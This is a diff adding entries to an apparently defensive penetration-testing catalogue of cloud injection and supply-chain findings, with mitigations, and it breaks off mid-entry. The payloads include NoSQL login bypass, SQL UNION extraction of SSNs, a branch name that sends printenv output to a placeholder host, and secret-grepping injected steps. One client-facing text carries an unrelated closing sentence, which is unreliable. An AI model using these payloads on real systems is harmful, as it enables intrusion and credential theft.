@@ -4226,6 +4226,2241 @@
      "name": "Identification and Authentication"
     }
    ]
+  },
+  {
+   "id": "CLOUD-040",
+   "domain": "CLOUD",
+   "title": "NoSQL Injection in Cloud-Managed Document Database",
+   "sequence": 623,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-943",
+   "prerequisites": "A cloud application backed by a managed NoSQL/document database (DynamoDB, Cosmos DB, Firestore, managed MongoDB) and authorization to test its inputs. Burp Suite and a proxy.",
+   "whatItIs": "Cloud applications frequently use managed document databases and build queries from user input. If input is placed into a query or filter without proper parameterization, an attacker can inject operators or expressions that change the query's logic — bypassing authentication, returning other users' data, or extracting the whole collection. This tests for NoSQL injection against a cloud-managed datastore.",
+   "rootCause": "Developers build NoSQL queries by interpolating user input into filter objects or expression strings, trusting the datastore to be 'injection-proof'. But operator injection ($ne, $gt, $where) and expression injection change query semantics just as SQL injection does.",
+   "impact": "Successful NoSQL injection can bypass login (always-true filters), read arbitrary users' documents, extract entire collections, or in expression-evaluating engines run attacker logic — a direct path to data breach and authentication bypass in the cloud datastore.",
+   "realWorldContext": "NoSQL injection has produced real authentication bypasses and mass data exposure, and managed cloud databases are not immune — the vulnerability is in how the application builds the query, not the datastore. As cloud apps standardize on document stores, operator- and expression-injection flaws have followed the data there.",
+   "difficulty": "Advanced",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify inputs that reach a NoSQL/document-database query (login, search, filters, API parameters).",
+    "Submit NoSQL operator payloads (e.g. {\"$ne\": null}, {\"$gt\": \"\"}) via JSON and observe behaviour changes.",
+    "Test authentication endpoints for always-true operator injection.",
+    "Test search/filter endpoints for returning more data than authorized.",
+    "For expression-evaluating engines, probe $where/JavaScript-expression injection.",
+    "Assess whether queries are parameterized and input types are validated."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test the application's database-backed inputs.",
+    "Map inputs to database operations and their content types (JSON vs form).",
+    "Inject operators into a login filter to attempt authentication bypass.",
+    "Inject operators into a data query to return other users' records.",
+    "Where the engine evaluates expressions, demonstrate expression injection safely.",
+    "Document the injection, the data exposed, and the parameterization gap."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Operator injection to bypass login (JSON body)",
+     "command": "curl -s https://<target>/api/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":{\"$ne\":null}}'"
+    },
+    {
+     "label": "Return all records via always-true filter",
+     "command": "curl -s 'https://<target>/api/items' -H 'Content-Type: application/json' -d '{\"filter\":{\"owner\":{\"$gt\":\"\"}}}'"
+    },
+    {
+     "label": "Expression/$where injection (engines that evaluate it)",
+     "command": "curl -s https://<target>/api/search -H 'Content-Type: application/json' -d '{\"q\":{\"$where\":\"1==1\"}}'"
+    },
+    {
+     "label": "Type-confusion via form parameters",
+     "command": "curl -s 'https://<target>/api/login' --data 'user=admin&pass[$ne]=x'"
+    }
+   ],
+   "variants": [
+    "Authentication bypass via {\"$ne\": null} on the password field.",
+    "Data exfiltration via always-true operator on a filter.",
+    "$where / JavaScript-expression injection in engines that evaluate it.",
+    "Type-confusion turning a string parameter into an operator object."
+   ],
+   "mitigation": [
+    "Parameterize queries and never build filters by interpolating raw input.",
+    "Strictly validate input types (reject objects where a string is expected).",
+    "Use the datastore SDK's safe query builders rather than string/JSON assembly.",
+    "Disable server-side expression evaluation ($where/JavaScript) where possible.",
+    "Apply least-privilege database credentials scoped per operation.",
+    "Add input allow-listing and schema validation at the API boundary."
+   ],
+   "mitigationClientFacing": "Cloud apps often use modern databases and build searches from what users type. If that input isn't handled safely, an attacker can slip in special commands that change what the database returns — letting them log in without a password or read other people's data. The fix is to build database queries safely using the database's own tools, strictly check that input is the expected type (a text value, not a hidden command), and give the app only the database permissions it needs.",
+   "reference": {
+    "standard": "A05:2025 - Injection",
+    "cwe": "CWE-943",
+    "tools": [
+     "Burp Suite",
+     "NoSQLMap",
+     "curl",
+     "mitmproxy"
+    ],
+    "links": [
+     "A05:2025 - Injection",
+     "MITRE ATT&CK T1190 (Exploit Public-Facing Application)",
+     "OWASP WSTG-INPV-05 (NoSQL Injection)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IAM",
+     "name": "Identity and Access Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-8",
+     "name": "Audit Log Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "IA",
+     "name": "Identification and Authentication"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-041",
+   "domain": "CLOUD",
+   "title": "Injection into Serverless Function via Event Payload",
+   "sequence": 624,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-94",
+   "prerequisites": "A serverless function (AWS Lambda, Azure Functions, GCP Cloud Functions) that processes event data, and authorization to send crafted events (via its trigger). AWS/cloud CLI and a proxy.",
+   "whatItIs": "Serverless functions are triggered by events — HTTP requests, queue messages, storage notifications — and often pass event fields into commands, queries, or interpreters. If a function uses event data unsafely (shell commands, eval, dynamic queries), an attacker who controls the event can inject code or commands into the function's execution. This tests for injection via serverless event payloads.",
+   "rootCause": "Functions treat event data as trusted internal input, and developers pass it into os.system, eval, subprocess, or query builders. Because events can come from attacker-influenced sources (a public HTTP trigger, an uploaded file's metadata), that input is not trustworthy.",
+   "impact": "Injected commands/code run with the function's execution role, enabling access to the function's cloud permissions, secrets in environment variables, connected resources, and lateral movement across the cloud account — a serious breach from one crafted event.",
+   "realWorldContext": "Serverless injection is a recognized cloud attack class: a function that shells out or evaluates event data hands its execution role to whoever controls the event, and its environment variables often hold secrets. As logic moves into functions, injection has moved with it, now yielding cloud credentials rather than just a shell.",
+   "difficulty": "Advanced",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify serverless functions and how they are triggered (HTTP, queue, storage, etc.).",
+    "Determine which event fields the function processes and how (commands, eval, queries).",
+    "Craft event payloads with injection markers in fields that reach dangerous sinks.",
+    "Observe whether injected commands/code execute (output, timing, out-of-band callbacks).",
+    "Assess the function's execution role and environment secrets.",
+    "Document the injection path and blast radius."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to send crafted events to the function's trigger.",
+    "Map event fields to the function's internal sinks (shell, eval, query).",
+    "Send a payload injecting a benign command/expression and confirm execution.",
+    "Demonstrate access to the function's environment (list env vars / role identity) safely.",
+    "Assess what the execution role and connected resources allow.",
+    "Document the injection, execution, and cloud-permission impact."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Command injection via an HTTP-trigger field",
+     "command": "curl -s 'https://<function-url>/process' -d '{\"filename\":\"a.txt; id\"}'"
+    },
+    {
+     "label": "Out-of-band confirmation (blind)",
+     "command": "curl -s 'https://<function-url>/process' -d '{\"filename\":\"a.txt; curl http://<collab>/$(whoami)\"}'"
+    },
+    {
+     "label": "Inspect execution-role identity (post-exec, in scope)",
+     "command": "# injected: aws sts get-caller-identity   (confirm the function's role)"
+    },
+    {
+     "label": "Reveal environment secrets (in scope)",
+     "command": "# injected: env | grep -Ei 'key|secret|token'   (function env vars)"
+    }
+   ],
+   "variants": [
+    "Command injection where the function shells out on an event field.",
+    "Code injection via eval of event data.",
+    "Injection through file/object metadata processed by a storage-triggered function.",
+    "Query injection where the function builds a datastore query from the event."
+   ],
+   "mitigation": [
+    "Never pass event data into shell, eval, or dynamic interpreters; use safe APIs.",
+    "Validate and allow-list event fields before use.",
+    "Apply least-privilege execution roles scoped to only what the function needs.",
+    "Store secrets in a secrets manager, not plaintext environment variables.",
+    "Sandbox and limit the function's outbound network access.",
+    "Add runtime protection and log/alert on anomalous function behaviour."
+   ],
+   "mitigationClientFacing": "Serverless functions run in response to events, and they often use data from those events in commands or code. If that data isn't handled safely, an attacker who can shape the event can run their own commands inside the function — gaining its cloud permissions and secrets. The fix is to never feed event data into commands or code interpreters, strictly validate it, give each function only the permissions it truly needs, and keep secrets in a proper secrets manager.",
+   "reference": {
+    "standard": "A05:2025 - Injection",
+    "cwe": "CWE-94",
+    "tools": [
+     "AWS CLI",
+     "Burp Suite",
+     "Interactsh",
+     "curl"
+    ],
+    "links": [
+     "A05:2025 - Injection",
+     "MITRE ATT&CK T1059 (Command and Scripting Interpreter)",
+     "MITRE ATT&CK T1552.007 (Container/Serverless Credentials)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1059",
+     "name": "Command and Scripting Interpreter",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "AIS",
+     "name": "Application and Interface Security"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-16",
+     "name": "Application Software Security"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-042",
+   "domain": "CLOUD",
+   "title": "SQL Injection into Cloud Query Services (Athena / BigQuery)",
+   "sequence": 625,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-89",
+   "prerequisites": "An application that runs queries against a cloud query/analytics service (Amazon Athena, Google BigQuery, Azure Synapse) using user input, and authorization to test. A proxy and the relevant cloud CLI.",
+   "whatItIs": "Cloud query and analytics services accept SQL, and applications frequently build these queries from user input to power dashboards, search, and reports. If input is concatenated into the SQL rather than parameterized, an attacker can inject SQL to read data beyond their scope — across datasets, tables, or tenants — or exfiltrate large volumes. This tests for SQL injection into cloud query services.",
+   "rootCause": "Developers assemble analytics SQL by string concatenation, assuming these services are 'just analytics'. But they execute SQL fully, so injected clauses (UNION, subqueries, cross-dataset references) run with the application's broad data access.",
+   "impact": "Injected SQL against a cloud query service can read across datasets and tenants, dump large tables, and exfiltrate sensitive analytics data — often with the application's wide read scope, turning one injectable parameter into a broad data breach.",
+   "realWorldContext": "SQL injection did not disappear with the move to cloud analytics — it followed the SQL. Applications building Athena or BigQuery queries from user input have exposed cross-dataset and cross-tenant data, because the injected SQL runs with the app's broad read access across the data lake.",
+   "difficulty": "Advanced",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify inputs that reach a cloud query/analytics service (search, filters, report parameters).",
+    "Test for SQL injection with classic probes (quotes, comments, boolean conditions).",
+    "Attempt UNION-based extraction to read additional columns/tables.",
+    "Test cross-dataset/cross-table references the app should not expose.",
+    "Assess the application's data-access scope on the query service.",
+    "Document the injection and the data reachable through it."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test the application's query-backed inputs.",
+    "Map inputs to cloud-query operations.",
+    "Confirm injection with boolean/error-based probes.",
+    "Use UNION or subqueries to extract data beyond the intended scope.",
+    "Demonstrate cross-dataset/tenant read where the app's scope allows.",
+    "Document the injection, exposed data, and parameterization gap."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Boolean-based injection probe",
+     "command": "curl -s \"https://<target>/report?region=US' AND '1'='1\""
+    },
+    {
+     "label": "UNION-based extraction",
+     "command": "curl -s \"https://<target>/report?region=US' UNION SELECT email,ssn FROM users--\""
+    },
+    {
+     "label": "Cross-dataset reference (BigQuery-style)",
+     "command": "curl -s \"https://<target>/report?region=US' UNION SELECT col1,col2 FROM \\`other_dataset.sensitive\\`--\""
+    },
+    {
+     "label": "Confirm app data scope",
+     "command": "# enumerate what datasets/tables the app's service account can read"
+    }
+   ],
+   "variants": [
+    "UNION-based extraction across tables in the data lake.",
+    "Cross-dataset reads via qualified table references.",
+    "Boolean/time-based blind injection where output is not reflected.",
+    "Cross-tenant data access due to the app's broad read scope."
+   ],
+   "mitigation": [
+    "Parameterize all queries to cloud query services; never concatenate user input.",
+    "Use the service SDK's parameterized query APIs.",
+    "Scope the application's service account to least-privilege dataset/table access.",
+    "Validate and allow-list input used in queries.",
+    "Isolate tenants at the data-access layer, not just in application logic.",
+    "Log and monitor queries for anomalous cross-dataset access."
+   ],
+   "mitigationClientFacing": "Cloud analytics services run SQL, and apps often build that SQL from what users type to power dashboards and reports. If the input isn't handled safely, an attacker can inject SQL to read data far beyond what they should see — across datasets and even other customers. The fix is to build these queries safely with parameters, give the app access to only the data it needs, and check input carefully.",
+   "reference": {
+    "standard": "A05:2025 - Injection",
+    "cwe": "CWE-89",
+    "tools": [
+     "Burp Suite",
+     "sqlmap",
+     "AWS/GCP CLI",
+     "curl"
+    ],
+    "links": [
+     "A05:2025 - Injection",
+     "MITRE ATT&CK T1190 (Exploit Public-Facing Application)",
+     "OWASP WSTG-INPV-05 (SQL Injection)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IVS",
+     "name": "Infrastructure and Virtualization Security"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-16",
+     "name": "Application Software Security"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-043",
+   "domain": "CLOUD",
+   "title": "Command Injection in Cloud CI/CD Pipeline",
+   "sequence": 626,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-78",
+   "prerequisites": "Access to influence a cloud CI/CD pipeline's inputs (branch names, PR titles, commit messages, build parameters) and authorization to test. Read access to the pipeline definition helps.",
+   "whatItIs": "Cloud CI/CD pipelines (GitHub Actions, GitLab CI, CodeBuild, Cloud Build) run shell scripts and frequently interpolate untrusted inputs — branch names, PR titles, commit messages — directly into commands. If these inputs are not neutralized, an attacker who can set them (e.g. via a pull request) can inject commands that run in the pipeline, stealing its cloud credentials and secrets. This tests for CI/CD command injection.",
+   "rootCause": "Pipeline authors interpolate context variables into run steps, treating them as safe metadata. But attacker-controllable fields (branch/PR/commit) flow into the shell unescaped, so they can inject commands into the build.",
+   "impact": "Injected commands run with the pipeline's identity — often holding cloud deployment credentials and secrets — enabling secret theft, malicious artifact injection into releases, and lateral movement into the cloud environment: a supply-chain-grade compromise from a crafted PR.",
+   "realWorldContext": "Poisoned-pipeline-execution and CI/CD command injection are well-documented: a malicious branch name or PR title interpolated into a run step executes attacker commands with the pipeline's cloud credentials. Real incidents have leaked deployment secrets and injected malicious build artifacts this way, making the pipeline a prime target.",
+   "difficulty": "Expert",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Review the pipeline definition for steps that interpolate context inputs (branch, PR, commit, tags) into shell commands.",
+    "Identify inputs an external contributor can control (fork PRs, branch names, titles).",
+    "Craft an input containing a benign command-injection marker.",
+    "Trigger the pipeline and observe whether the injected command runs.",
+    "Assess the pipeline identity's cloud permissions and accessible secrets.",
+    "Document the injection path and blast radius."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test the pipeline via controlled inputs.",
+    "Map attacker-controllable inputs to unsafe interpolation in run steps.",
+    "Set an input (e.g. a branch name) with a benign injected command.",
+    "Trigger a pipeline run and confirm the injected command executed (via logs/out-of-band).",
+    "Safely demonstrate access to the pipeline's identity and secrets in scope.",
+    "Document the injection, execution, and cloud-credential impact."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Inject via a crafted branch name",
+     "command": "git checkout -b '$(curl http://<collab>/$(printenv | base64 -w0))' && git push origin HEAD"
+    },
+    {
+     "label": "Inject via a PR title/commit message",
+     "command": "git commit -m 'fix; echo INJECTED_$(whoami)'   # if interpolated into a run step"
+    },
+    {
+     "label": "Reveal pipeline secrets (in scope)",
+     "command": "# injected step: env | grep -Ei 'token|secret|key|aws' "
+    },
+    {
+     "label": "Confirm pipeline cloud identity (in scope)",
+     "command": "# injected step: aws sts get-caller-identity || gcloud auth list"
+    }
+   ],
+   "variants": [
+    "Command injection via an unescaped branch name in a run step.",
+    "Injection via PR title/commit message interpolation.",
+    "Poisoned fork-PR pipeline execution stealing secrets.",
+    "Malicious artifact injected into a release build."
+   ],
+   "mitigation": [
+    "Never interpolate untrusted context inputs directly into shell steps; pass them via environment variables and quote safely.",
+    "Use the CI platform's safe input handling and avoid inline expression injection.",
+    "Restrict pipeline permissions to least privilege; avoid long-lived cloud credentials.",
+    "Require approval for pipelines triggered by fork/external PRs.",
+    "Isolate and scope secrets; rotate any that a pipeline could expose.",
+    "Scan pipeline definitions for injection patterns and monitor build behaviour."
+   ],
+   "mitigationClientFacing": "Automated build-and-deploy pipelines run scripts and often drop in details like branch names or pull-request titles. If those aren't handled safely, an attacker can put commands into, say, a branch name and have them run inside your pipeline — stealing the cloud credentials and secrets it holds. The fix is to never place untrusted text directly into pipeline commands, give pipelines only the permissions they need, and require approval for builds triggered by outside contributors.",
+   "reference": {
+    "standard": "A05:2025 - Injection",
+    "cwe": "CWE-78",
+    "tools": [
+     "GitHub Actions review",
+     "Interactsh",
+     "git",
+     "gitleaks"
+    ],
+    "links": [
+     "A05:2025 - Injection",
+     "MITRE ATT&CK T1195.002 (Compromise Software Supply Chain)",
+     "MITRE ATT&CK T1552 (Unsecured Credentials)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1059",
+     "name": "Command and Scripting Interpreter",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IAM",
+     "name": "Identity and Access Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-5",
+     "name": "Account Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-044",
+   "domain": "CLOUD",
+   "title": "Injection into Managed Search (Elasticsearch / OpenSearch)",
+   "sequence": 627,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-943",
+   "prerequisites": "An application backed by a managed search service (Amazon OpenSearch, Elastic Cloud) that builds queries from user input, and authorization to test. Burp Suite and curl.",
+   "whatItIs": "Managed search services power app search features, and applications often build their query DSL (or Lucene query strings) from user input. If input is placed into the query without proper handling, an attacker can inject query syntax or, worse, script expressions — reading data beyond their scope, bypassing filters, or in script-enabled clusters executing code. This tests for injection into a managed search backend.",
+   "rootCause": "Developers concatenate user input into query-string or DSL queries, trusting the search layer. But Lucene query syntax, boolean logic, and (where enabled) Painless/script queries change query behaviour or execute logic when input is injected.",
+   "impact": "Search injection can bypass access filters to read other users' or tenants' documents, enumerate the index, and — on clusters with scripting enabled — execute script expressions, escalating to data exfiltration or code execution against the search backend.",
+   "realWorldContext": "Search-query injection has exposed data where apps build Elasticsearch/OpenSearch queries from raw input, and script-query injection has reached code execution on clusters with scripting enabled. As search moved to managed cloud services, these flaws moved with it — the vulnerability is in the app's query construction, not the service.",
+   "difficulty": "Advanced",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify inputs that reach a managed search query (search boxes, filters, API parameters).",
+    "Inject query-string syntax (boolean operators, wildcards, field references) and observe scope changes.",
+    "Test whether access/tenant filters can be bypassed via injected boolean logic.",
+    "Enumerate index/field names through injected queries.",
+    "Where scripting is enabled, probe script-query (Painless) injection safely.",
+    "Assess how the application constructs and scopes queries."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test the search-backed inputs.",
+    "Map inputs to the search query construction.",
+    "Inject query syntax to return documents beyond the intended scope.",
+    "Attempt to bypass access/tenant filters via injected boolean clauses.",
+    "Where scripting is enabled, demonstrate script-query injection safely.",
+    "Document the injection, data exposed, and query-construction gap."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Query-string injection to widen scope",
+     "command": "curl -s 'https://<target>/search?q=title:secret%20OR%20_exists_:ssn'"
+    },
+    {
+     "label": "Bypass an access filter via boolean injection",
+     "command": "curl -s 'https://<target>/search?q=mine%20OR%20owner:*'"
+    },
+    {
+     "label": "Enumerate fields",
+     "command": "curl -s 'https://<target>/search?q=_exists_:internal_notes'"
+    },
+    {
+     "label": "Script-query injection (scripting enabled, in scope)",
+     "command": "curl -s https://<target>/search -H 'Content-Type: application/json' -d '{\"query\":{\"script\":{\"script\":\"1==1\"}}}'"
+    }
+   ],
+   "variants": [
+    "Access-filter bypass via injected OR/wildcard clauses.",
+    "Cross-tenant document read through query injection.",
+    "Index/field enumeration via _exists_ and wildcards.",
+    "Script-query (Painless) injection on scripting-enabled clusters."
+   ],
+   "mitigation": [
+    "Build search queries with the client's safe/structured query APIs, not string concatenation.",
+    "Enforce access/tenant filters server-side in a way user input cannot alter.",
+    "Disable dynamic scripting on the cluster unless strictly required.",
+    "Validate and escape user input used in query strings.",
+    "Scope the application's search credentials to least privilege per index.",
+    "Monitor search queries for anomalous scope and script usage."
+   ],
+   "mitigationClientFacing": "App search features are often powered by cloud search services, and apps build the search from what users type. If that isn't handled safely, an attacker can inject search syntax to read data they shouldn't — including other customers' — or, on some setups, run code. The fix is to build search queries with the service's safe tools, enforce access limits on the server side where users can't tamper with them, and turn off scripting unless you truly need it.",
+   "reference": {
+    "standard": "A05:2025 - Injection",
+    "cwe": "CWE-943",
+    "tools": [
+     "Burp Suite",
+     "curl",
+     "OpenSearch client review"
+    ],
+    "links": [
+     "A05:2025 - Injection",
+     "MITRE ATT&CK T1190 (Exploit Public-Facing Application)",
+     "OWASP WSTG-INPV (Injection)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IVS",
+     "name": "Infrastructure and Virtualization Security"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-4",
+     "name": "Secure Configuration of Enterprise Assets and Software"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-045",
+   "domain": "CLOUD",
+   "title": "Vulnerable Container Base Image with Known CVEs",
+   "sequence": 758,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-1104",
+   "prerequisites": "Access to the container images/registry and authorization to scan them. A container image scanner (Trivy, Grype).",
+   "whatItIs": "Cloud workloads run in containers built on base images that bundle an OS and libraries. If the base image (or added layers) carries known-vulnerable packages, every container inherits them. This tests for vulnerable container images in the cloud supply chain.",
+   "rootCause": "Base images are chosen once and rarely rebuilt, and images are deployed without scanning, so known-vulnerable packages accumulate and ship to production.",
+   "impact": "A vulnerable image can expose the workload to remote exploitation, privilege escalation within the container, and — with a container escape — the host/cluster, from a flaw baked into the image.",
+   "realWorldContext": "Vulnerable container images are one of the most common cloud supply-chain findings, and unscanned base images routinely ship critical CVEs to production. Scanning images in CI and rebuilding on patched bases is the fix.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Enumerate container images in use and their base images/layers.",
+    "Scan images for known-vulnerable OS packages and libraries.",
+    "Identify critical/high vulnerabilities and their reachability.",
+    "Assess whether images are scanned in CI and rebuilt regularly.",
+    "Check for outdated/EOL base images.",
+    "Document the vulnerable-image exposure."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to scan the container images/registry.",
+    "Pull and scan the images with a container scanner.",
+    "Identify critical/high CVEs in base and added layers.",
+    "Assess exploitability in the running workload's context.",
+    "Show the absence of image scanning behind the outdated packages.",
+    "Document the findings and remediation priority."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Scan an image for CVEs",
+     "command": "trivy image <registry>/<image>:<tag>"
+    },
+    {
+     "label": "Alternative scanner",
+     "command": "grype <registry>/<image>:<tag>"
+    },
+    {
+     "label": "Inspect the base image",
+     "command": "docker history <registry>/<image>:<tag> --no-trunc"
+    },
+    {
+     "label": "Check for EOL base",
+     "command": "# identify the base image and whether its distro version is still supported"
+    }
+   ],
+   "variants": [
+    "Critical CVE in an OS package in the base image.",
+    "Vulnerable library added in an app layer.",
+    "EOL base image no longer patched.",
+    "Reachable vulnerability exploitable in the workload."
+   ],
+   "mitigation": [
+    "Scan container images in CI and block on critical vulnerabilities.",
+    "Rebuild on patched, minimal, supported base images regularly.",
+    "Use minimal/distroless bases to reduce the attack surface.",
+    "Track and remediate image CVEs on a cadence.",
+    "Sign and verify images; use trusted registries.",
+    "Maintain an inventory of images and their base versions."
+   ],
+   "mitigationClientFacing": "Cloud apps run in containers built on 'base images' that include an operating system and libraries. If the base image has known security flaws, every container inherits them. The fix is to scan container images for known vulnerabilities before deploying, rebuild on up-to-date, minimal base images regularly, and use trusted image sources. The result is that a stolen key or a misconfigured service can no longer be used to reach far beyond what it was meant to touch, containing the damage from any single mistake.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-1104",
+    "tools": [
+     "Trivy",
+     "Grype",
+     "Docker",
+     "Clair"
+    ],
+    "links": [
+     "A03:2025 - Software Supply Chain Failures",
+     "MITRE ATT&CK T1190 (Exploit Public-Facing Application)",
+     "MITRE ATT&CK T1610 (Deploy Container)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "TVM",
+     "name": "Threat and Vulnerability Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-7",
+     "name": "Continuous Vulnerability Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-046",
+   "domain": "CLOUD",
+   "title": "Unpinned or Unverified Third-Party IaC Modules",
+   "sequence": 759,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-829",
+   "prerequisites": "Access to the Infrastructure-as-Code (Terraform/CloudFormation) and its module sources, and authorization to review. IaC tooling.",
+   "whatItIs": "Cloud infrastructure is defined with IaC that often pulls in third-party modules (Terraform registry, Git). If modules are referenced without version pinning or integrity verification, a compromised or malicious module can alter the infrastructure it provisions. This tests IaC module supply-chain integrity.",
+   "rootCause": "IaC modules are referenced for reuse, often by a floating version or branch, without pinning or verification, so a changed/malicious module is pulled on the next apply.",
+   "impact": "A compromised IaC module can provision backdoored infrastructure — over-permissive roles, exposed resources, exfiltration paths — as a trusted part of the deployment, a high-impact supply-chain attack on the cloud environment.",
+   "realWorldContext": "Malicious and typosquatted IaC modules are a recognized cloud supply-chain risk, and unpinned modules pull whatever the source currently serves — including a compromised version. Pinning modules to verified versions/hashes is the fix.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Enumerate third-party IaC modules and how they are referenced (version/branch/hash).",
+    "Assess whether modules are pinned to versions/commits and verified.",
+    "Check the module sources' trustworthiness.",
+    "Assess what infrastructure/permissions modules provision.",
+    "Identify unpinned/unverified modules that could inject changes.",
+    "Document the IaC module supply-chain gap."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to review the IaC and its modules.",
+    "Map module references and their pinning/verification.",
+    "Identify floating/unpinned module references.",
+    "Assess the impact of a compromised module (permissions, resources).",
+    "Show how an unverified module could inject malicious infrastructure.",
+    "Document the module supply-chain weakness."
+   ],
+   "examplePayloads": [
+    {
+     "label": "List module sources and versions",
+     "command": "grep -rniE 'source|version' *.tf | grep -iE 'module|registry|git::'"
+    },
+    {
+     "label": "Check for pinning",
+     "command": "# are modules pinned to a version constraint or a commit hash, or a floating branch?"
+    },
+    {
+     "label": "Assess module trust",
+     "command": "# is the module from a trusted, verified source?"
+    },
+    {
+     "label": "Assess provisioned impact",
+     "command": "# what roles/resources does the module create; how permissive?"
+    }
+   ],
+   "variants": [
+    "Module referenced by a floating branch/tag.",
+    "No version/hash pinning.",
+    "Module from an untrusted/typosquatted source.",
+    "Module provisioning over-permissive roles."
+   ],
+   "mitigation": [
+    "Pin IaC modules to specific verified versions or commit hashes.",
+    "Use trusted, reviewed module sources; vet third-party modules.",
+    "Verify module integrity (checksums/signatures where available).",
+    "Review what modules provision, especially permissions.",
+    "Scan IaC for supply-chain and misconfiguration issues in CI.",
+    "Mirror/vendor critical modules internally."
+   ],
+   "mitigationClientFacing": "Cloud infrastructure is often built using reusable modules from third parties, and if those aren't locked to a verified version, a compromised module can build backdoored infrastructure. The fix is to pin infrastructure modules to specific, verified versions, use trusted sources, review what they create (especially permissions), and scan your infrastructure code for problems. This keeps a compromised build tool or a poisoned template from silently shipping attacker-controlled infrastructure into your live environment.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-829",
+    "tools": [
+     "Terraform",
+     "Checkov",
+     "tfsec",
+     "Trivy"
+    ],
+    "links": [
+     "A03:2025 - Software Supply Chain Failures",
+     "MITRE ATT&CK T1195 (Supply Chain Compromise)",
+     "MITRE ATT&CK T1078.004 (Cloud Accounts)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
